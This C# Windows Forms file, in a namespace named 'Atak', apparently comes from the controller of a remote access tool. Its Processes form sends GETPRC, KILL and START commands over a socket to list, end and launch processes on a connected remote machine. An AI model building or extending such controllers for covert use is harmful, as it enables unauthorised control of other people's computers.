﻿using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Atak
{
    public partial class Processes : Form
    {
        Socket socket;
        public Processes(Socket socket)
        {
            this.socket = socket;
            InitializeComponent();
        }

        private void Processes_Load(object sender, EventArgs e)
        {         
            refresh();
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].Text != null)
            {
                socket.Send(Encoding.UTF8.GetBytes("KILL|" + listView1.SelectedItems[0].SubItems[1].Text));
            }
        }

        private void startNewProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = Interaction.InputBox("App path for start", "Atak");
            socket.Send(Encoding.UTF8.GetBytes("START|" + path));
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            refresh();
        }

        void refresh()
        {
            listView1.Items.Clear();
            socket.Send(Encoding.UTF8.GetBytes("GETPRC"));
        }

        private void sortAZToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.Sorting = SortOrder.Ascending;
        }
    }
}
